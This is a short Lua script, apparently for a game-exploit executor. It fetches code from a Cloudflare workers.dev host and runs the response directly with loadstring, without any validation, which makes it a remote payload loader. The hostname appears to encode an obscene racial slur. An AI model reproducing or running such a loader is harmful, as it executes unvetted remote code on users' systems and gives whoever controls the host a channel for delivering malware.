local response = request({
    Url = "https://c3vjaybtesbkawnrigjpdgnoigfzcybuawdnzxigy29tzsbzdwnrig15igrpy2s.authorized1337.workers.dev/",
    Headers = {
        ["X-Request-Type"] = "api",
    },
    Method = "GET"
})

if response and response.Body then
    local run = loadstring(response.Body)
    if run then
        run()
    else
        print("Failed to load")
    end
else
    print("Failed to fetch")
end